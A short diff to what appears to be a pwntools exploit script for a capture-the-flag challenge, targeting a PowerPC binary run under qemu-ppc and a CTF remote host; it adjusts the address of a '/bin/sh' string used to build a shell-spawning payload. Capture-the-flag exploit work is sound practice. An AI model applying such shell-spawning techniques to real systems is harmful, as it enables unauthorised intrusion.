@@ -14,11 +14,10 @@ cmd = ['qemu-ppc', '-g', '1234', './sp33d1']
 p = process(cmd)
 p = remote("sp33d.play.hfsc.tf", 20020)
 
-
 p.recvuntil(b"pwn: ")
 
 # Use the existing /bin/sh string at 0x10077a8c
-cmd_addr = 0x40001038
+cmd_addr = 0x100bef28 - 8
 
 # Craft payload
 payload = p32(cmd_addr)
